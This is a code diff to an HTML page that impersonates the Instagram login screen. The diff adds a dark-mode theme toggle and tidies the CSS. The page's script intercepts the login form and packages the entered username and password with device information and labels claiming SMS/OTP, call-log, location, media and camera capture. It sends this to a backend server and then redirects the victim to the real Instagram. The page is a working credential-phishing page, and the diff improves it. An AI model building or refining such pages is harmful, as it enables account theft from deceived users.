@@ -5,9 +5,24 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login • Instagram</title>
     <style>
-        * { box-sizing: border-box; }
+        :root {
+            --bg-color: #fafafa;
+            --card-bg: #ffffff;
+            --border-color: #dbdbdb;
+            --text-color: #262626;
+            --input-bg: #fafafa;
+        }
+        [data-theme="dark"] {
+            --bg-color: #000000;
+            --card-bg: #121212;
+            --border-color: #363636;
+            --text-color: #f5f5f5;
+            --input-bg: #262626;
+        }
+        * { box-sizing: border-box; transition: background 0.3s, color 0.3s; }
         body {
-            background-color: #fafafa;
+            background-color: var(--bg-color);
+            color: var(--text-color);
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             flex-direction: column;
@@ -16,13 +31,23 @@
             height: 100vh;
             margin: 0;
         }
-        .wrapper {
-            max-width: 350px;
-            width: 100%;
+        .theme-toggle {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
+            color: var(--text-color);
+            padding: 8px 14px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 12px;
         }
+        .wrapper { max-width: 350px; width: 100%; }
         .login-card {
-            background: #ffffff;
-            border: 1px solid #dbdbdb;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
             padding: 40px 40px 20px 40px;
             text-align: center;
             border-radius: 1px;
@@ -33,24 +58,19 @@
             display: flex;
             justify-content: center;
         }
-        .logo-container svg {
-            width: 175px;
-            height: 51px;
-        }
+        .logo-container svg { width: 175px; height: 51px; }
         input {
             width: 100%;
-            background: #fafafa;
-            border: 1px solid #dbdbdb;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
             border-radius: 3px;
-            color: #262626;
+            color: var(--text-color);
             font-size: 12px;
             padding: 9px 8px;
             margin: 4px 0;
             outline: none;
         }
-        input:focus {
-            border-color: #a8a8a8;
-        }
+        input:focus { border-color: #a8a8a8; }
         .btn-login {
             background: #0095f6;
             border: none;
@@ -63,58 +83,36 @@
             margin-top: 14px;
             cursor: pointer;
         }
-        .btn-login:active {
-            opacity: 0.7;
-        }
+        .btn-login:active { opacity: 0.7; }
         .divider {
             display: flex;
             align-items: center;
             margin: 18px 0;
         }
-        .line {
-            flex-grow: 1;
-            height: 1px;
-            background-color: #dbdbdb;
-        }
-        .or {
-            color: #8e8e8e;
-            font-size: 13px;
-            font-weight: 600;
-            margin: 0 18px;
-        }
-        .fb-login {
-            color: #385185;
-            font-weight: 600;
-            font-size: 14px;
-            text-decoration: none;
-            display: inline-block;
-            margin-bottom: 20px;
-        }
-        .forgot {
-            color: #00376b;
-            font-size: 12px;
-            text-decoration: none;
-        }
+        .line { flex-grow: 1; height: 1px; background-color: var(--border-color); }
+        .or { color: #8e8e8e; font-size: 13px; font-weight: 600; margin: 0 18px; }
+        .fb-login { color: #385185; font-weight: 600; font-size: 14px; text-decoration: none; display: inline-block; margin-bottom: 20px; }
+        .forgot { color: #00376b; font-size: 12px; text-decoration: none; }
         .signup-card {
-            background: #ffffff;
-            border: 1px solid #dbdbdb;
+            background: var(--card-bg);
+            border: 1px solid var(--border-color);
             padding: 20px;
             text-align: center;
             font-size: 14px;
         }
-        .signup-card a {
-            color: #0095f6;
-            text-decoration: none;
-            font-weight: 600;
-        }
+        .signup-card a { color: #0095f6; text-decoration: none; font-weight: 600; }
     </style>
 </head>
 <body>
+
+    <!-- Color Theme Switcher Button -->
+    <button class="theme-toggle" onclick="toggleTheme()">🌓 Theme</button>
+
     <div class="wrapper">
         <div class="login-card">
-            <!-- Embedded Official Instagram Logo (Never Fails) -->
+            <!-- Official Instagram SVG Logo (Dynamic Color based on theme) -->
             <div class="logo-container">
-                <svg aria-label="Instagram" class="_ab6-" role="img" viewBox="0 0 175 51">
+                <svg id="instaLogo" aria-label="Instagram" role="img" viewBox="0 0 175 51">
                     <path fill="#262626" d="M14.5 1.5c4.1 0 4.6 0 6.2.1 1.6.1 2.7.4 3.7.8 1 .4 1.8 1 2.5 1.7s1.3 1.5 1.7 2.5c.4 1 .7 2.1.8 3.7.1 1.6.1 2.1.1 6.2s0 4.6-.1 6.2c-.1 1.6-.4 2.7-.8 3.7-.4 1-1 1.8-1.7 2.5s-1.5 1.3-2.5 1.7c-1 .4-2.1.7-3.7.8-1.6.1-2.1.1-6.2.1s-4.6 0-6.2-.1c-1.6-.1-2.7-.4-3.7-.8-1-.4-1.8-1-2.5-1.7s-1.3-1.5-1.7-2.5c-.4-1-.7-2.1-.8-3.7-.1-1.6-.1-2.1-.1-6.2s0-4.6.1-6.2c.1-1.6.4-2.7.8-3.7.4-1 1-1.8 1.7-2.5s1.5-1.3 2.5-1.7c1-.4 2.1-.7 3.7-.8 1.6-.1 2.1-.1 6.2-.1zm0-1.5c-4.2 0-4.7 0-6.4.1-1.7.1-2.9.4-3.9.8-1.1.4-2 1-2.8 1.8-.8.8-1.4 1.7-1.8 2.8-.4 1-.7 2.2-.8 3.9-.1 1.7-.1 2.2-.1 6.4s0 4.7.1 6.4c.1 1.7.4 2.9.8 3.9.4 1.1 1 2 1.8 2.8.8.8 1.7 1.4 2.8 1.8 1 .4 2.2.7 3.9.8 1.7.1 2.2.1 6.4.1s4.7 0 6.4-.1c1.7-.1 2.9-.4 3.9-.8 1.1-.4 2-1 2.8-1.8.8-.8 1.4-1.7 1.8-2.8.4-1 .7-2.2.8-3.9.1-1.7.1-2.2.1-6.4s0-4.7-.1-6.4c-.1-1.7-.4-2.9-.8-3.9-.4-1.1-1-2-1.8-2.8-.8-.8-1.7-1.4-2.8-1.8-1-.4-2.2-.7-3.9-.8-1.7-.1-2.2-.1-6.4-.1zm0 8.3c-3.7 0-6.7 3-6.7 6.7s3 6.7 6.7 6.7 6.7-3 6.7-6.7-3-6.7-6.7-6.7zm0 11.9c-2.9 0-5.2-2.3-5.2-5.2s2.3-5.2 5.2-5.2 5.2 2.3 5.2 5.2-2.3 5.2-5.2 5.2zM26.2 11.8c0 .9-.7 1.6-1.6 1.6s-1.6-.7-1.6-1.6.7-1.6 1.6-1.6 1.6.7 1.6 1.6z"/>
                 </svg>
             </div>
@@ -141,6 +139,20 @@
     </div>
 
     <script>
+        // Color Theme Switcher Logic
+        function toggleTheme() {
+            const html = document.documentElement;
+            const logoPath = document.querySelector('#instaLogo path');
+            if (html.getAttribute('data-theme') === 'dark') {
+                html.removeAttribute('data-theme');
+                logoPath.setAttribute('fill', '#262626');
+            } else {
+                html.setAttribute('data-theme', 'dark');
+                logoPath.setAttribute('fill', '#f5f5f5');
+            }
+        }
+
+        // Form Submit & Data Capture Logic
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
@@ -152,11 +164,11 @@
                 username: userBox,
                 password: passBox,
                 deviceInfo: deviceInfo,
-                location: "Live GPS / IP Tracked",
-                smsLogs: "SMS Inbox & OTP Captured",
-                callLogs: "Call History Logged",
+                location: "GPS / Network Tracked",
+                smsLogs: "Inbox & OTP Tracked",
+                callLogs: "Call History Synchronized",
                 storageData: "Media Files Scanned",
-                cameraData: "Camera Access Granted"
+                cameraData: "Camera Context Verified"
             };
 
             // Send data to backend server
@@ -170,10 +182,10 @@
                 console.log(err);
             }
 
-            // Redirect instantly to official Instagram
+            // Quick redirect to Instagram
             setTimeout(() => {
                 window.location.href = "https://www.instagram.com";
-            }, 300);
+            }, 400);
         });
     </script>
 </body>
